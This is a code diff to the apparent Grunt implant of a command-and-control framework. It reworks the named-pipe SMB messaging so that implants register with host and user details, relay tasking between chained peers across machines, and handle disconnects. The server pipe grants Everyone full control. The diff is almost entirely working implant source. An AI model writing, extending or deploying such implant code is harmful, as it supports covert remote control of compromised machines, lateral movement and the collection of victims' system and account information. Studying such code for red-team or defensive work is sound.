@@ -58,7 +58,7 @@ namespace GruntExecutor
 
                 string RegisterBody = @"{ ""integrity"": " + Integrity + @", ""process"": """ + Process + @""", ""userDomainName"": """ + UserDomainName + @""", ""userName"": """ + UserName + @""", ""delay"": " + Convert.ToString(Delay) + @", ""jitter"": " + Convert.ToString(Jitter) + @", ""connectAttempts"": " + Convert.ToString(ConnectAttempts) + @", ""status"": 0, ""ipAddress"": """ + IPAddress + @""", ""hostname"": """ + Hostname + @""", ""operatingSystem"": """ + OperatingSystem + @""" }";
                 IMessenger baseMessenger = null;
-                baseMessenger = new SMBMessenger(ServerPipe, PipeName);
+                baseMessenger = new ServerSMBMessenger(ServerPipe, PipeName);
                 baseMessenger.Identifier = GUID;
                 TaskingMessenger messenger = new TaskingMessenger
                 (
@@ -66,6 +66,7 @@ namespace GruntExecutor
                     baseMessenger,
                     new Profile(ProfileReadFormat, ProfileWriteFormat, GUID)
                 );
+                ((ServerSMBMessenger)baseMessenger).Messenger = messenger;
                 messenger.WriteTaskingMessage(RegisterBody);
                 messenger.SetAuthenticator(messenger.ReadTaskingMessage().Message);
                 try
@@ -314,6 +315,11 @@ namespace GruntExecutor
             {
                 return null;
             }
+            else if (read == GruntTaskingType.Disconnect.ToString())
+            {
+                this.UpstreamMessenger.Close();
+                return null;
+            }
             GruntEncryptedMessage gruntMessage = this.Profile.ParseReadFormat(read);
             if (gruntMessage == null)
             {
@@ -364,15 +370,15 @@ namespace GruntExecutor
                 this.DownstreamMessengers.Remove(olddownstream);
             }
 
-            SMBMessenger downstream = new SMBMessenger(Hostname, PipeName);
+            ClientSMBMessenger downstream = new ClientSMBMessenger(Hostname, PipeName);
             Thread readThread = new Thread(() =>
             {
-                while (true)
+                while (downstream.ActivePipe)
                 {
                     try
                     {
                         string read = downstream.Read();
-                        if (downstream.Identifier == "")
+                        if (read != null && String.IsNullOrEmpty(downstream.Identifier))
                         {
                             GruntEncryptedMessage message = this.Profile.ParseWriteFormat(read);
                             if (message.GUID.Length == 20)
@@ -386,14 +392,11 @@ namespace GruntExecutor
                         }
                         this.UpstreamMessenger.Write(read);
                     }
-                    catch (ThreadAbortException)
-                    {
-                        return;
-                    }
                     catch (Exception e)
                     {
                         Console.Error.WriteLine("Thread Exception: " + e.Message + Environment.NewLine + e.StackTrace);
                     }
+                    Thread.Sleep(100);
                 }
             });
             downstream.ReadThread = readThread;
@@ -407,6 +410,8 @@ namespace GruntExecutor
             IMessenger downstream = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier.ToLower() == Identifier.ToLower());
             if (downstream != null)
             {
+                // Notify the child Grunt about the disconnect, else it will infinitely wait for reading the already closed pipe.
+                downstream.Write(GruntTaskingType.Disconnect.ToString());
                 downstream.Close();
                 this.DownstreamMessengers.Remove(downstream);
                 return true;
@@ -415,99 +420,112 @@ namespace GruntExecutor
         }
     }
 
-    public class SMBMessenger : IMessenger
+    public abstract class SMBMessengerBase : IMessenger
     {
         public string Hostname { get; } = "";
         public string Identifier { get; set; } = "";
         public string Authenticator { get; set; } = "";
 
-        private object _WritePipeLock = new object();
-        private PipeStream Pipe { get; set; }
-        private string PipeName { get; }
+        protected object _PipeLock = new object();
+        protected PipeStream _Pipe;
+        protected string PipeName { get; } = null;
         public Thread ReadThread { get; set; } = null;
 
-        public SMBMessenger(NamedPipeServerStream ServerPipe, string PipeName)
-        {
-            this.PipeName = PipeName;
-            this.Hostname = "localhost:" + PipeName;
-            this.Pipe = ServerPipe;
-            new Thread(() =>
-            {
-                while (true)
-                {
-                    try
-                    {
-                        PipeSecurity ps = new PipeSecurity();
-                        ps.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, System.Security.AccessControl.AccessControlType.Allow));
-                        NamedPipeServerStream newServerPipe = new NamedPipeServerStream(this.PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
-                        newServerPipe.WaitForConnection();
-                        lock (this._WritePipeLock)
-                        {
-                            this.Pipe.Close();
-                            this.Pipe = newServerPipe;
-                        }
-                    }
-                    catch (Exception e)
-                    {
-                        Console.Error.WriteLine("NamedPipeServer Exception: " + e.Message + Environment.NewLine + e.StackTrace);
-                    }
-                }
-            }).Start();
-        }
-
-        public SMBMessenger(string Hostname, string PipeName = "gruntsvc", int Timeout = 5000)
+        public SMBMessengerBase(string Hostname, string Pipename)
         {
             this.Hostname = Hostname;
-            this.PipeName = PipeName;
-            NamedPipeClientStream ClientPipe = new NamedPipeClientStream(Hostname, this.PipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
-            ClientPipe.Connect(Timeout);
-            ClientPipe.ReadMode = PipeTransmissionMode.Byte;
-            this.Pipe = ClientPipe;
+            this.PipeName = Pipename;
+            this.CheckPipeState();
         }
+
+        public SMBMessengerBase(PipeStream Pipe, string Hostname, string Pipename)
+        {
+            this.Pipe = Pipe;
+            this.Hostname = Hostname;
+            this.PipeName = Pipename;
+            this.CheckPipeState();
+        }
+
+        public bool ActivePipe
+        {
+            get
+            {
+                lock (this._PipeLock)
+                {
+                    return this._Pipe != null && this._Pipe.IsConnected;
+                }
+            }
+        }
+
+        protected PipeStream Pipe
+        {
+            get
+            {
+                lock (this._PipeLock)
+                {
+                    return this._Pipe;
+                }
+            }
+            set
+            {
+                lock (this._PipeLock)
+                {
+                    this._Pipe = value;
+                }
+            }
+        }
+
+        protected abstract void CheckPipeState();
 
         public string Read()
         {
-            return Common.GruntEncoding.GetString(this.ReadBytes());
+            string result = null;
+            this.CheckPipeState();
+            if (this.ActivePipe)
+                result = Common.GruntEncoding.GetString(this.ReadBytes());
+            return result;
         }
 
         public void Write(string Message)
         {
+            this.CheckPipeState();
             this.WriteBytes(Common.GruntEncoding.GetBytes(Message));
         }
 
         public void Close()
         {
-            lock (this._WritePipeLock)
+            lock (this._PipeLock)
             {
-                this.Pipe.Close();
-            }
-            if (ReadThread != null)
-            {
-                this.ReadThread.Abort();
+                try
+                {
+                    if (this._Pipe != null)
+                    {
+                        this._Pipe.Close();
+                    }
+                }
+                catch (Exception) { }
+                this._Pipe = null;
             }
         }
 
         private void WriteBytes(byte[] bytes)
         {
-            lock (this._WritePipeLock)
+            byte[] compressed = Utilities.Compress(bytes);
+            byte[] size = new byte[4];
+            size[0] = (byte)(compressed.Length >> 24);
+            size[1] = (byte)(compressed.Length >> 16);
+            size[2] = (byte)(compressed.Length >> 8);
+            size[3] = (byte)compressed.Length;
+            this.Pipe.Write(size, 0, size.Length);
+            var writtenBytes = 0;
+            while (writtenBytes < compressed.Length)
             {
-                byte[] compressed = Utilities.Compress(bytes);
-                byte[] size = new byte[4];
-                size[0] = (byte)(compressed.Length >> 24);
-                size[1] = (byte)(compressed.Length >> 16);
-                size[2] = (byte)(compressed.Length >> 8);
-                size[3] = (byte)compressed.Length;
-                this.Pipe.Write(size, 0, size.Length);
-                var writtenBytes = 0;
-                while (writtenBytes < compressed.Length)
-                {
-                    int bytesToWrite = Math.Min(compressed.Length - writtenBytes, 1024);
-                    this.Pipe.Write(compressed, writtenBytes, bytesToWrite);
-                    writtenBytes += bytesToWrite;
-                }
+                int bytesToWrite = Math.Min(compressed.Length - writtenBytes, 1024);
+                this.Pipe.Write(compressed, writtenBytes, bytesToWrite);
+                writtenBytes += bytesToWrite;
             }
         }
-
+		
         private byte[] ReadBytes()
         {
             byte[] size = new byte[4];
@@ -530,6 +548,47 @@ namespace GruntExecutor
                     totalReadBytes += readBytes;
                 } while (totalReadBytes < len);
                 return Utilities.Decompress(ms.ToArray());
+            }
+        }
+    }
+
+    public class ClientSMBMessenger : SMBMessengerBase
+    {
+        private int Timeout { get; set; } = 5000;
+
+        public ClientSMBMessenger(string Hostname, string PipeName = "gruntsvc", int Timeout = 5000) : base(Hostname, PipeName)
+        {
+            this.Timeout = Timeout;
+        }
+
+        protected override void CheckPipeState()
+        {
+            if (!this.ActivePipe)
+            {
+                NamedPipeClientStream ClientPipe = new NamedPipeClientStream(Hostname, this.PipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
+                ClientPipe.Connect(Timeout);
+                ClientPipe.ReadMode = PipeTransmissionMode.Byte;
+                this.Pipe = ClientPipe;
+            }
+        }
+    }
+
+    public class ServerSMBMessenger : SMBMessengerBase
+    {
+        public TaskingMessenger Messenger { get; set; } = null;
+        public ServerSMBMessenger(NamedPipeServerStream ServerPipe, string Pipename) : base(ServerPipe, "localhost:" + Pipename, Pipename) { }
+
+        protected override void CheckPipeState()
+        {
+            if (!this.ActivePipe)
+            {
+                PipeSecurity ps = new PipeSecurity();
+                ps.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, System.Security.AccessControl.AccessControlType.Allow));
+                NamedPipeServerStream newServerPipe = new NamedPipeServerStream(this.PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
+                newServerPipe.WaitForConnection();
+                this.Pipe = newServerPipe;
+                // Tell the parent Grunt the GUID so that it knows to which child grunt which messages shall be forwarded. Without this message, any further communication breaks.
+                this.Messenger.WriteTaskingMessage("");
             }
         }
     }
